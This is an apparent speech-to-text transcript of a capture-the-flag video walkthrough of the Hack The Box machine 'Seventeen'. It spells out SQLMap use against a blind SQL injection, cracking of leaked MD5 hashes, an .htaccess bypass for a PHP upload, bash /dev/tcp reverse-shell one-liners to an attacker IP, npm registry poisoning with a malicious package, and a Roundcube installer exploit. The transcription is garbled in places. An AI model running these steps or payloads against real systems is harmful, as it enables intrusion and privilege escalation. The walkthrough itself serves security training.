 what's going on YouTube this is ipsack I'm doing 17 from hack the box and this box had a lot of steps one could even joke it had 17 steps in it it starts out with finding a web app for a school system that's vulnerable to SQL injection you can SQL map it and get access to the database which links to other virtual hosts another one for schools and then round Cube which is an online mailer thing now the other one related to schools lets you upload files there's some Protections in to try to prevent you from executing code but there's two unintended ways to get code execution that we'll dive into because it makes this box a lot easier the intended path is just use the file upload don't execute code on that web app instead go to round Cube and find a file inclusion vulnerability guess the path of your file upload and get a shell that way and then once you get on the box it's all about exploiting a local npm registry that's running on the box but we'll get into that at the end of the video so let's just jump in as always we'll start with our end map so SC for deep default scripts as the enumerate versions OA I'll put all formats when the nmap directory and call it 17 and then the IP address of 10 10 11 165. this can take some time to run so I've already ran it looking at the results we have just three ports open the first one being SSH on Port 22 and it's running on an Ubuntu server and we also get the specific version of Ubuntu that's for Ubuntu 0.7 which if we throw it into Google and go to Launchpad it's going to tell us this is Ubuntu bionic which is um Ubuntu 18. and this is going to be relevant near the end of the video I know uh because it's relevant for the Prevost you could just check it by looking at like Etsy LSB release also Lin peas will tell you but once you get into the command line you're like flooded with information and can completely Miss exactly what distort it is and right now this is the early state of Recon you don't have that much information so I think it's important to note it is Ubuntu 18 and we'll get more into that a bit later um the next Port we have is HTTP on Port 80 and it's running Apache also leaks it's Ubuntu and the exact version which would point back to well that's weird I'm noticing Apache versions differ 2429 and 2438 they're both leaking Ubuntu so right now I'm guessing there's some type of weird routing at play Maybe Docker or um some virtual like virtualization because having two different versions of Apache installed is really bizarre um so yeah we have a web server on Port 80 and 8000 and also the one on 8000 is running Debian so probably gonna be docker let's go take a look at the website so 10 10 11 165. copy this so we can go to booth and we just get forbidden as and map had told us on this one and on this page we get a looks like a static website that just has information so I'm going to check if this is truly static so the first thing I'm going to do is like index.php to see if I can find exactly what the file is and seeing index.html I know this is probably static um just a standard bootstrap page that doesn't have any Dynamic content if like slash index worked I would be guessing it's some type of um framework maybe laurable Django flask things like that but just saying index.html it's not really cluing me in on anything to do any type of attacks maybe a go Buster to find hidden files or directories um looking at the top of the page we do see it leaking 17.hdb which is a host name so let's add this into our host file so pseudo VI etsyhost uh 10 10 11 165. put this in and we can check 17.hdb and we get the same exact page so nothing new there we can look at the source code of the page to see if there's anything odd that would link to the um thing that's being used I'm guessing it's some type of static site Builder I'm drawing a blank on some examples but I don't really see anything that interesting we do have two links it looks like uh cabbagecon or however you pronounce that name and if we looked at the page I'm guessing the GitHub Lincoln up here this is where they get posted to so I'm going to check them out to see if there's any source code that hints what this is and I'm guessing this is just going to be the creator of the Box because this is very security related with the rock buffer overflow evil twin attack so I'm guessing this is just advertisement for his own social media type things so I'm not going to spend too much time there we could run a go Buster to try to find hidden files or virtual host enumeration because we do have a domain name I'm going to do the V host enumeration first because boiler I've solved the Box before and don't want to waste time just running a bunch of Recon that um doesn't end up anywhere so for that I'm going to use fluff and I'm using fuff because I want to show you something I learned recently generally I would use like go Buster V host enumeration things like that but you can do fluff just as well so you the URL 10 10 11 165 the word list we'll use is opseclist uh Discovery DNS uh subdomains top 5000 and then we have to specify the um header for host fuzz Dot 17.htb and then hit enter once it is defaulted to 533 lines so I'm going to do FL for filter lines 533. and we're gonna see only one thing comes back and that is exam and one of the things that always puzzled me is I consistently got different results from fuff and W fuzz and that's why I always default to W fuzz because I was too lazy to figure it out but it's right in front of me um let's just run that same exact command with W fuzz and we'll have to change one thing because W fuzz instead of using the word filter they use the word hide right so we can do W fuzz and change this filter lines for HL for hide lines um what W Falls you host is a different number of lines being reported 532. okay so that's another difference I'm guessing maybe fuff trims the very last line break I don't know um but running this we will get GC dot underscore MSC DS so we're getting other results than just exam with the same exact word list um and the reason for that is this matcher and fuff so if we look at fuff's help and go up to the match we see it defaults to a few status codes right so when I run this even though I didn't specify any match it's only going to match on the status codes so if you want to match on all so it replicates W fuzz's Behavior you have to do MC for match code and then just specify all and now it will display everything that wfuzz does so there's just one gotcha that's got me a lot of times especially when like fuzzing apis with F that use a lot of weird status codes um things just don't show up so always like take this into mind when using fuff so with that being said let's take a look at the actual domain so let's add exam Dot 17. 17.hdb to a host file and go back to Firefox and exam.17.htb and we get a examination review system and the oddest thing is the use of comic sense because if you look at this application in depth you realize it's not just custom coded for this box so if we look at the page Source we see it's the exam reviewer management system which I just said so let's copy this and go over to search boy and we find exploits for it right and it is SQL injection we also have a rce but this is saying authenticated we don't have any credentials yet so let's just look at this right so searchpoint Dash X and view the exploit and the vulnerable URL is pointed here 127001 erms slash uh parameter I'm guessing is take exam and ID is equal to one and it's saying it's a Boolean based blind exploit so for this I'm going to use um SQL map because when you do Boolean Blaze bind you can only extract like one character at a time and it's a huge pain to do manually so let's go and test this out by going back to the web page and seeing if there's a place to take exams and the reason why I'm doing it this way I'm guessing this is the ID is because I always like passing the full request into SQL map because that way it like keeps all the headers if you just use like the dash U option then you risk the chance of like the user agent being set by SQL map and the default for that says it's SQL map which a lot of like waffs will pick up on and I don't see any way to take this exam so maybe we will go back um so let's go back to searchploit and we want this right so let's copy this whole thing go to the website and not found maybe it's not erms okay so here's this I wonder if we do take exam 999 we have unknown exam ID so that got deleted oh this is getting really annoying um I was gonna demonstrate the Boolean based blind but based upon all the redirects I'm getting annoyed and we'll just copy it so let's see and we'll explain what happens so for the Boolean based blind what it does is uses SQL injection but either makes this a true or false statement um let me see if I can show this real easily so take exam ID equals one we get a 200 okay let's do all nines still the same thing let's see content length 7824 content length 2683 so we have a difference in the content length so when one exam doesn't exist um it sounds like 13 000 less bytes so if we do a SQL injection so or one equals one like this right we have to URL encode it and let's see maybe we put a comment we get 26.83 because 1 equals one is true right what if we do or one equals two we have that as still 20 000 bytes because this statement is correct right so if we put ID is equal to 2 we're at 35 000 bytes let's see okay so maybe two was good I put ID equals 9 99 7824 bytes so now we change this or one equals one and we get back to twenty thousand bytes right so this is exactly how a Boolean baste thing will work because it's taking the output and says if the first character of the output is equal to a and then checks the size sees it's not that it goes okay the first level of the output is equal to B and eventually it pieces together the whole SQL injection one character at a time by asking it questions right that's the Boolean based blind um huge pain in the butt to do so the easiest way is SQL map so we take a query like this and then we can just copy it to a file and we want to specify this is 17. and I'll call this um take exam.request and then we can go over to our terminal and escrow map Dash R take exam.thequest and it told us the um injection was in ID so I'm going to do Dash p ID and we can put it in batch mode right and it's going to tell us this is Boolean based blind right so hopefully it does it looks like it is telling it it's going to check for a bunch of other things because whenever you do um like blind injection it's always slow so it wants to test for things that can extract more data out such as a union injection because if we can do a union we don't have to ask it questions we can just say hey give us data right so it believes it is Union injectable and it's going to try a bunch I'm going to see it fails so I'm just going to speed up the video or jump ahead because we don't need to watch this go slowly and there we have it SQL map is done and we can tell it is only either Boolean based or time based the only thing really worse than Boolean based is time based queries because instead of just asking it yes or no question and telling you you're making it cause a delay so instead of getting a response immediately it takes seconds and is much slower so it's going to default to the Boolean based blind and the very first thing I generally do whenever it's this type of injection is change my threads to 10 so it goes a bit quicker and the first thing I want to check is my privileges and the thing I'm looking for here is if I have the file privilege which would let me extract uh files off the file system and potentially get like um the configuration files which could lead to a password and we can see I am the MySQL user and my only privilege is usage not file so I can't extract files so the next thing I want to look at is what databases exist on the server right so I'm going to do the dash dash DBS and it's going to tell me all the databases and if this was uni injection I may try just a dump and dump everything but again you can see how long it's taking just tell me information schema and like there's 100 tables in that so it would just take forever I have to let this like run overnight um we can see the databases we have sfms ermsdb and round Cube DB I'm guessing the erms is going to be this exam review management system I don't know what sfms is so my first thing is let's extract out of ermsdb so Dash capital D for database erms underscore DB and then we do dash dash tables to extract all these tables so I'm just gonna pause the video and speed it up because extracting this information is going to take a while and out of these tables uh the one that is most interesting to me is users because that can contain uh passwords and things like that so Dash T users dash dash dump to see what information is in here and just like always I'm going to speed up the video so we don't just wait for this to happen so right away we can see something interesting but I just hate how line wrapping looks in general so I'm going to view it with less with a dash capital S to disable it and now I don't like how it's just a table um so let's just go back to how it was uh no good way to view this data I guess we see old management actually there is if we open this up in uh let's copy and then open this up in vim and maybe if I replace uh commas with tabs and now we do the less is that going to be better it is uh no it's not but oh well um we got Avatar and the weird thing is this whole old management thing so if we think about where files are generally stored it's probably gonna be verb dub dub dub HTML and then maybe the website and then files avatar.png so Bing dot dot slash I think this means like multiple virtual hostra on this site right because it's going out of its directory going into a different virtual host which may be called Old management so let's take a look to see if this site exists so sudo V Etsy host and we can add old let's just paste it so I don't typo it and if you don't understand what I said there we can explain it real quick we got HTML for www erms and then ver dub dub dub old management right so this is probably in my mind how the website is set up and we have this exam review management system and it's pulling like it says the Avatar isn't in erms it goes up One Directory which means it's at verb dub dub dub and now specifying the name of the different website which would be old management it's a hack that a lot of just bad website or web developers will use so uh let's go to old management17.hdb to see if this exists and hitting enter here we get a different site it's the school file management system and oddly enough it directs us to Port 8000. this is where we're getting the Forbidden earlier and this is probably a different virtual host remember because when we hit Port 8000 it was now a Debian host in um or nmap scans there's something odd is going on here it is sfms and if we look at the database so let's go back to this um weird directory and SQL map let's see escrow map output exam I thought DBS would be somewhere here um dump your msdb let's just do DBS and then we look at the output we has sfms in here we have the school file management system so let's dump this and while we dump this let's try cracking all the hashes that we have so far so I'm going to run SQL map whoops SQL map Dash R take exam we're going to switch the table I'm going to do dash dash tables to see what tables are in here and while that happens I'm going to Cat uses dot text we'll go into awk the field separator will be tab shoot I think I just do it like this I've never used arc on Tab I think let's see does this work uh maybe we put it in double quotes single quotes uh is it capital f it is so now we can do field separator um we have two tables so we have user well we have 30 tables user storage and student so I'm going to specify user I wonder if I can do two tables with a comma let's do user and student um doesn't look like we can do two so I'm just going to run it twice oh wait what Dash T user oh we have to add the dash dump student there we go I think it's gonna dump both so now let's go and try to get the data we want out of this CSV file so we want the name let's do less dash s so probably username so one two three four five six and the password will be five I guess right so awk print five that's hashes six that's usernames awesome so let's do six colon five and we have username password we can just copy these and this looks like it's just md5 sums so I'm going to go to the Kraken which looks like it may be offline so I'm going to pause the video and power it up okay so let's SSH to the Kraken go into a hashcap folder and then V hashes I'll call this 17 Dot md5 and we'll paste these in so dot slash hashcat and then mode for md5 I want to say is zero off top my head we'll just try this first hashes 17 Dot md5 and we have to specify I think dash dash user because we have username colon the password uh is it an opt yeah opt word list rocky.txt and we can start trying to crack this right and we get no results I could specify a rule file so like rules inside Pro password Pro is gently the first rule file I use or maybe best64 to see if anything cracks then we could also send it over to like crackstation but nothing cracks here right so we don't have any good results but we are extracting a second database and it looks like it is still cracking that's with my pause to boot up the server so SQL map can definitely take a while so I'm gonna pause the video again and we're just gonna wait for this one to extract all the hashes so now that this is done we can copy where this is if I cat this file um pretty much the same thing this is the student file system and you log in with student number so I'm going to use that as the um username so sdu s-t-u-d underscore n o um let's do awk Dash f a field separator this one is just a comma and then print this is going to be four I think that looks like student number and then we jump to a head to get to the hash so this will be six so we have more md5s so we can copy these add them to a hash file and put this and we did SQL map against two tables right so let's go up this one cracked it to user.csv so I'm just going to specify user.csv and awk is I think backwards we want the first name and then the hash so for six and is this the same ones that we had before let's see fc8 that's the same B5 so Mark's password looks different here and Steve is different as well so we can just try cracking these all again I'll do it without the rule file because that does make it take a bit longer we had one right away so if I just do the dash dash show we can see three one two three Four's password is auto destruction so let's log in so three one two three four and then log in with auto destruction and while that goes I'm going to specify the rules file to always run something in the background and looking at this we have a file upload form and this is just running standard PHP so a lot of times this is exploitable right so the first thing to figure out is how it's storing files if I hover over this download link we can see it's just download.php store ID equals 33. so if I click download we can open this in Firefox and we just see it's the 17 educational it's a PDF and it's talking about the mastermailer.17.hdb which if we went there is going to be round Cube and that's the intended way to exploit this box we're going to go an unintended route because um this is you're just throwing a cve and I don't think you're learning that much I'll cover round Cube at the end of the video most likely but I'm going to keep going down this unintended route right so we have a file upload form and if we look at exactly how this is downloaded so I'm going to do users.csv and then intercept upload a file and we can see uh the parameters it takes is going to be file name and we give it users.csv and the contents of this and we're also sending this student number 31234 which is the students so there's a few ways it could be storing this file the easiest way to figure this out um is probably downloading the source code because this is an open source application but the first place I'd actually check is the database because we can extract anything right so if we look at the tables here we can see there are three tables usage storage and student we already looked at user and store uh student so the only thing left is storage so if we go back to our dump command and change that to storage we can get the information out of that and that store ID student num file name file type and date uploaded unfortunately we don't have the full path here right um we're looking at the download it sends only the store ID which is 33 and this is the information the application has to give them the file now there's one good thing we see here uh or we don't see and we don't see like blob because they could store the files in the database and if they do all paths to code execution are pretty much dead because include statements won't be able to include something out of the database you'd have to find an eval statement in PHP code and that's much much more difficult to find so there's both good and bad right now um and we have to figure out exactly how the files are stored based upon this information now there's a few ways the developer could do that um probably the most common by Juniors would be like um the student number then Dash the file name and so example like if I was 9001 it would be Please Subscribe dot text uh if I can spell like that would be the example and the dangerous thing here is if they put a PHP extension you may be able to execute code the thing we have to test for here is if there's like a files directory or something like that so we could go bust this but just guessing slash files we get forbidden and if we do file not found so chances are files go here right so we could test with like three one three two four dash marksheet finals dot PDF right and we get not found so um that's not how the developer is doing it now another way to do it would be to do the student number as a directory and then they could do the file name right so if they do student number then slash file name and we can easily test for that by just doing files three one three two four is that the actual thing three one two three four whoops um and we get forbidden so we know this directory exists so the last thing to do would just be um what is it marksheet Dash finals dot PDF and we get to the PDF so we know this is how the developer is doing it we'll download the source code in just a minute if I was writing the report on how to do this my recommendation would probably be md5 summing it or using any type of hashing um you may want to recommend like shot 256 hashes because people are averse to using md5 hashes but in this you're not using it for security you're just using it to get a random file name right and by just having a random file name you no longer give them control over the extension which is definitely good the other thing that we'd want to do is make sure like PHP wrappers are disabled on the site because if you store a file this way and they put something in a zip they can still control the phone name that is in my crime stopper video but the main thing here is preventing users from being able to guess another user's file right so how I would do that is I do recommend like do the md5 call we have date uploaded here so I'd say put date uploaded then we can do the student number and then um maybe store ID as well and then the file name and I'd probably move store ID to the beginning for the sake of explanation and explain the logic behind each of these pieces um I'd be using the date uploaded and the store ID this would be like assault right um all the purpose of this piece if I can type where is that there it is the purpose of that piece is just to make it random so if you knew my student number was 9001 and I uploaded password.txt you couldn't just make the md5 sum of 9001 password.txt and guess my file right um the purpose of student number is to prevent collisions right so if I upload password.txt and you upload password.txt we don't want to overwrite each other's files so that's the purpose of the student number there and the file name is to um make sure I don't overwrite my own files right that should be obvious so that would be a more secure way to do it um you could also put in the database which is good but um can be taxing on the database I guess so let's look at the source code to see exactly how the developer did it because it is open source and we have an excuse to review source code so let's review source code let's go back a few times and I'm going to Google School management system source code and we get to this website called sourcecodester.com and if we scroll down there is a download link download a start in a few seconds waiting for it to download we have it here so let's make a downloads directory and then move downloads um what is the file name it is schoolmate file so it's School file management system unzip it and I'm going to guess it's in save file.php so we can see a few things here number one it's saying if the file exists files then student number then create it and then move the file in there so all this is doing is copying a file in a directory now this piece is a different unintended that will go into in a few minutes but first let's just try uploading a PHP file so vid.php or we'll call this hip.php I guess and all we're going to do is run assistant command like that uh we can go all out and do a shell I guess request um shell like this I think that's typed right and let's upload this so file hip.php add file and now we know it's going to be in my student ID which is or it's going to be in files if dot PHP right and we get forbidden so if we tried other files let's go back to the upload browse ip.php let's send this to prep Suite so we can easily um change text and instead of ip.php I'll do ip.php7 we'll do phtml uh far as another thing include and just try all these files right so we can turn it up so we'd also we can test this quickly if you just Google like alternative PHP extensions you'd find a long list so files three one two three four ip.php blocked php7 uh we should probably view the source we see it's just printing it so it's not executing hip dot include uh far so all these extensions aren't getting executed and PHP is getting forbidden now in Apache generally how you block a PHP script in One Directory is a DOT HT access file so we can try just uploading a DOT HT access and deleting the contents uh deleting the contents and now when we go to ip.php we can error because system can't execute and if we just do shell is equal to ID now we can get code execution so we uploaded a different copy of HD access which removed the file restriction now there's a second way we could have done about this and if we just go back to where we upload ip.php if we change the student number to 9001 and upload it um fail to open stream I wonder if I just clobbered something on the server no such file let's go back a few hip.php if I try to upload this okay that's fine let's do 9001 that's fine I'm guessing I screwed something up but now we're back to that if I go in here and say files 9001 we also get a shell because I believe the machine Creator put that HD access file there to stop code execution not knowing that you could just create a new folder and when you do the application itself doesn't create that HD access so that's why earlier when I was explaining the different ways to save things that um having like all the user content go in a dynamically created directory is dangerous because if someone says oh this is um user created code we should block it with an HD access they may be able to change where it writes to in a different directory which then the HC access isn't there and you bypass that so that's why generally I just like md5 something at all and not letting the user ever control the extension because it limits the attack surface um doesn't fully prevent it like I said before if you watch my Crime Stoppers video you'll find a way around that and some edge cases but it's defense and depth right so let's get a shell here um I'm just going to send this over to bribsweet so let's clear a proxy put in repeater and I always like sending it in the post because the post has less Bad characters than the git and we can do bash Dash C bash Dash I Dev TCP um 10 10 14 8 9001 do that and one like that we will URL encode this NC lvnp 9001 send it get the shell and then python3 Dash C input PTY pty.spawn Ben Bash uh Python 3 not found uh is it script Dash Q Bash then sdty raw minus Echo FG then export term is equal to X term maybe we have to run Bash there we go so now we have a proper TTY where we have tab autocomplete and everything it looks like we are in a Docker container just because of this hostname so let's just take a look at the actual web applications doing an LS there's an HTML directory look here and it looks like we have the three web servers employee management Master mailer and old management so if I look at employee management system the main thing we want to find is the configuration to extract all the potential passwords so let's do LS grep config is there one no let's see let's go in here I'm just going to look at index I guess that's an HTML file um let's just head on I guess mark.php probably doesn't matter which one the main thing I was looking for is this require once and we have processdbh dot PHP I'm guessing this is the database configuration we look at this we have 20 20 best year of my life so that is one credential and I'm going to add this into just PW dot text on my Kraken I'm going to create a custom word list just to see if there's any passwords here right so if I look at Master mailer and let's see is there a config there's a directory and then config.ink.php uh let's see grep Dash I password oh there's a lot of passwords here but it looks like it is right here MySQL user and then MySQL password so we can copy this and add this one here and then there is old management and I'm guessing it's in DB that's a SQL file that's not it um let's just head login.php and let's grab require out of login.php because it's Gotta load it somehow right let's see grep Dash I my sequel and all these files let's see there's the MySQL queries see less index.php no file less I hate PHP files that mix in this see cat login.php this has to talk to the database so it's got to be in here let's see or maybe it's in login query there's no less login query.php finally there's a directory called admin and it's con.php and we can see it's MySQL password which I think is the password we already had it is so we only have two new passwords here and if we do dot slash uh we probably have this in a history right so we can just change out the rocku.txt and we called it pw.txt to see if this gets any new cracks already finished let's just do dash dash show and we don't have any new passwords here so there's no password reuse among the users in the database if we look at past WD on this we do have a user called Mark so if we try let's say sh Mark at 17.hdb accept it oh there's Auto destruction let's see if I can type Auto destruction that's not a valid password let's copy the other password it's 20 20 best year of my life so copy this SSH I don't know why it's not saving this host I wonder if we have to log in for it to save and we get sshed in so I'm going to do an ipaddr and we see all these interfaces which indicates we are on the host operating system so we've escaped the docker uh by SSH again with some reused credentials and now let's just take a look around this file system looks like there is user.text but everything else pretty bare this is interesting we have a DOT npm directory if I look into this it is empty so if we look back at the pass WD file here I'm going to grab for everything that ends in sh and we can see three users root kavi and Mark if I go to slash home we do see kavi but we can't get into his directory we can look at the file system for every file owned by kavi so find slash Dash user kavi and direct errors to devnoll and we probably should do a dash LS as well so we see the full permissions of it we see home copy not interesting interesting enough we do have our mail kavi and everyone can read it so let's cat VAR mail copy and the key thing here is it's talking about some type of private registry and they moved old logger and added log level you just to publish it to the registry and test it with the application so if we look at all the listening ports on this box there's a lot of them a lot of these on six thousand um interesting enough there's nothing on 8 000. and that's because um I guess of something hack the Box did and they have 8 000 being a load balancer to all these 6000 ports and that's done via iptables um I forget exactly what box showcased that I think it was sync so if you want an explanation of that that would be in sync how to do that but so 6 000 ports if we just curl it curl localhost 6008 you can see it goes to that Debian box which is the same exact thing as if we had curled um 17.hdb port 8000. and you know it's going to the docker because of that Debian right the one port that doesn't really make sense right now is this 4873 and if I curl it we're going somewhere right so the easiest way is to just set up a port forward so I'm going to do the squiggly C and that's gonna be the very first uh thing I type on a line and that puts me in this SSH prompt and we can do Dash L for local port forward 4873 localhost 4873 so now if I go to my port 4873 is going to go through the SSH session and take me to that point right so we can see easily it's an application called um vertigo I think that's how you pronounce it and it's an npm uh yeah uh registry an npm registry so if we do npm Dash h we can see options I believe and there is let's see there's a publish to publish it there is a search option it's probably easy if I just search it so search so if we did like npm search and we can specify the registry as http localhost 4873 and this is going to search that registry for all of the packages on it and registry is just another name for like package manager think of it right so we can see the packages on this registry big number JS core util DB logger um log level and the author of DB logger is kavi and if we look back at that mail um they removed old logger and added log level instead and if we look at the um log level and then look at the other name that has log in it I'm guessing this is going to be the old log of the db-logger so let's install this so we can download it from the registry so I'm just going to go into a directory we're going to run that npm command again but this time I'm going to specify install and we're going to install that package DB logger so this is going to connect to the registry download db-logger and install it to my current working directory so we go node modules and then we can look at DB logger and that's the package.json that explains it and then the source code logger.js and we can see it's creating a MySQL connection root the password is I hate mathematics123 and the database is logger so we could now do MySQL Dash U root Dash p um I guess we can't log in I figured we'd be able to so it doesn't look like we can log into the database with those credentials but kavi is the creator of that so if I sh kavi at 17.hdb uh yes paste in the password and we can SSH as kavi we could have also just done Su to test it to switch users and do it that way as well but now we're at Hobby on the system do it lsla here looks pretty much the same if we look at the Studio's list we can see kavi can run a application called startup.php so let's take a look at this application so it starts off with creating like a list object of two items DB logger and log level Loops through it and then runs a npm-l gripping for the dependency so the first one is going to look for DB logger the second one is going to look for log level and then it's going to attempt to install it change the owner and then execute this node application so my first thought is every binary here is using the full path so there's no way to do any type of path injection so the most logical thing is we have to poison the registry right so what is in my clipboard right now not the password I want um let's see it was M logger because we want to do an npm login right to log into the registry if we do kavi the password to the the whole directory get deleted already wow um let's install it maybe there's a con that's actually wiping out Devas shm which is odd but oh well so if I catch or go into was it DB logger we can get this password to try to log in email let's do kavi at 17.htb and we see the user registration is disabled so we can't log in which means we probably can't update this registry now remember at the beginning the video when I said it being on Ubuntu 18 is going to be important and there's a lot of issues with Ubuntu up to this version in version 19 they changed it but the pseudo by default and Ubuntu 18 and before will preserve the home directory variable so if I did let's do pseudo-l uh save my password already if I did sudo opt app startup.sh it's not actually pulling Roots home directory to load things so this I wonder if that npm debug is a hint at that let's delete that file real quick if I run this again do it LS I don't know where that npm debug file came from but um all the variable it's using is pulling from kavi not root so we can edit this npm RSC file to point to us for the registry so instead of 127001 I'm going to change this to 10 10 14 8. and we can exit this nclvmp 4873 so now when I run this pseudo command it should reach back to my box but it didn't there see registry 10 10 14 8 4 8 7 3. oh I'm guessing it's because I had it installed let's go into a new directory where I am not run this again and there we go it says installing log level and we see it's making the request back to my box so what we have to do is stand up a registry on um our box so it installs the malicious version of log level and to do that I'm going to run Docker and I think I have Docker installed already I do so let's do sudo uh Docker pull uh how do we spell this what is the name v-e-r-d-a-c-c-i-l like that I think so we can pull the latest version and we can stop this for now and now that we pulled the version we want to run it locally so we do a Docker run Dash it to allocate a pseudo TTY dash dash RM to delete this container when we're done then the port 4873 that's the port it listens on on a host we bind that to the port in the docker I'm just assuming uh radakia's default Port is 4873 because that's what it was on the hack the Box machine and then the um image we pulled and we can run this and it looks like it has started up so let us do a npm ad user because in order to push an image to it we need to log in so we can specify the registry as HTTP 10 10 14 8 4873 username ipsack password please subscribe the email let's just do any email it doesn't matter and it says we logged in and what this did was write to our npm RC file adding the auth token so anytime we access the registry at 10 10 14 84873 we have an authentication token and I don't know exactly how this is stored let's just see if this is random Echo dash n base64-d yeah it looks like it's just a random token so um not exactly sure how that stores but that is not important so now we can authenticate against the registry we have to make the malicious package right so I'm going to make a package called log level because I think that's what it is on the box and we're just going to do npm init and then the package name log level the version it just has to be greater than what's on the target so if I do npm install log level it is let's see it's thinking at least I think the impact's name is log level it's at one eight zero so we can just do one eight one and then the entry point is index.js so all we have to do is create index.js and we can put a um malicious one-liner for um node so we require the child process which if you're familiar with like um python it would there's a symbol like import OS I guess and then we can execute a reverse shell so bash Dash C bash Dash I Dev TCP 10 10 14 8. 9001 zero and one like that and I want to say that's all we have to do so now we can do npm publish registry HTTP 10 10 14 8. uh four eight seven three so we have written this package to our registry so let's go back to our home make sure the npm is pointed to us so dot NP MRC change this to 10 10 14 8. and I'm going to listen 9001 so we catch the reverse shell that looks good and now we can run that serial command and as soon as I got rid of the password um let's see do we have it here yes we do awesome as I say as soon as I get rid of the password I needed it because it was in that other terminal pane I think but we have it there so we can do pseudo opt app startup.sh it's checking checking for log level installing it we see it made the request to us we have a connection here um does not look like it actually worked though I couldn't do LS let's see cat index.js that looks like it should have worked let's just copy and paste this that's fine weird um we definitely executed a command though so what I'm going to do is change this to be a chmod 4755 tap shell so we're going to create a set uid binary and we'll copy bin bash to Temp shell package.json now we got to make this one eight two and the one thing we forgot to do is we have to change the owner as well so CH own root root tap shell there we go now we can publish again and let us run this checking for DB logger and it's taking a while I'm gonna make sure my npm RC follows still pointed at me it is not 10 10 14 8. run this it's taking a while let's just go into a new directory I'm not sure if this matters I wonder if we hung this box or something okay there we go it just took a long time to identify DB loggers installed but I don't see it hitting my server so I'm guessing it's not actually installing anything let's see oh there we go it went to install so let us see if temp shell is now owned by root so tap shell it is now owned by root and it being complete red I think that means it's set uid so temp shell Dash p ID effective uid is root so CD slash root and now we can read root dot text so I'm not exactly sure why my reverse shell did not work I'm guessing there was a special character a typo somewhere there but now we have this working and got root on the box so now we can go into the intended way to get a shell which involved round cube and a cve so let's go into that so let me just clean up my panes because at this point we did not have a shell on the box and then go back to our web browser and go to where we could download files and let's download the PDF and look at it it's going to talk about master mailer and this is the round Cube instance that we had just completely skipped but now let's just take a look at it real quick so sudo VI Etsy host add in mastermailer.htb and now we can navigate there and we get a round Cube instance if we don't know its round Cube based upon the logo it is in the HTML source but the main thing we want to do is figure out the version of round Cube that is running now the easiest way to do that always is just look at GitHub so GitHub search round Cube go to the source code and see exactly how this project is laid out and they do have like installed license make file change log so let's check something real quick so if we go to round Cube Master mailer let's try install and we have the install instructions but nothing's indicating the version so let's try change log and we get version 142. so now let's Google round Cube 142 release notes and we see it was probably released around January 1st 2020 telling us this instance of round cube is very old so now let's look for cves if we go to the miter page we see we can pick anything before like January 1st 2022 I think or 2020. 2020 it was so from here and down I believe 3.5 4.3 probably not um rsce so we don't care about it the first two we get across is um 12 641 and 12 640. if we looked into these 12 641 I believe requires emailing someone so I'm just gonna skip that one I'm gonna look at this cve so Googling that cve then GitHub we can go to a page that has a proof of concept and the hard thing about this is in order to exploit this two things have to happen number one we have to have access to the installer so if we go to the installer directory looks like we do so that is good generally whenever you install software you should always remove the installer directory because bad things always seem to happen with it and then the second thing is we have to have a place where we can upload a PHP file and a folder and in the old management we have a way to upload PHP files but we now we need a folder so what I'm going to do is just cheat a little bit we know there's the files path you're supposed to find this out through um viewing the source code right we downloaded that already and if we put it directly that doesn't exist we get not found so we could have ran like go Buster and if we did we discover there's a directory called papers in this folder and because there's a directory called papers here now we can upload papers.php and mimic the structure that let's see let me close uh the structure right here so I'm going to move ip.php to papers.php and let's just put a reverse shell here and hard code the whole thing so bash Dash C bash Dash I Dev TCP 10 10 14 8 9001 zero and one like that close it all out we got our reverse shell and this is what we want to upload so let's go back to Old management uh right here browse uploadpapers.php make sure intercept is on in both places add the file of just for this request we'd actually need to intercept that but papers.php exist so now the next step we have to do is send this post request and we'll have to edit the location because in this POC they're assuming you have shell on the server and they just created this but we don't have shell so we have to put the path that we wrote to and kind of guess where it is because we didn't have any way to leak files so let us go to the round Cube installer or is it right here and I'm just going to click that update config button so we get a skeleton of our post that we want I'm going to delete this because we don't care about the parameters because we just want to send the parameters of the POC and of course replacing the dev shm thing so it's going to be verb dub dub dub and the tricky part is knowing it's Verda build it could either be old management slash let's see where is the path files three one two four so it could either be this or verb dub dub dub HTML and really it could be an opt it could be anywhere but these are the two common locations either www HTML and then the directory and then the directory so these would be the most two common places we can send it and if we scroll down let's see does it say updated webmail installer it says config file was saved successfully so we overwrote the config of Master mailer replacing the plugins directory with this and what it's going to do is append the dot PHP for us and round Cube puts it in an include so we bypass that HT access rule that was there to begin with so now if we start up a listener so nclvnp 9001 and then access a round Cube page hopefully we'll get a shell so hit enter there and now we have a shell here so that is doing it the intended way um I really for some reason just don't like that uh cve I like doing it the unintended way better but hope you guys enjoyed it take care and I'll see you all next week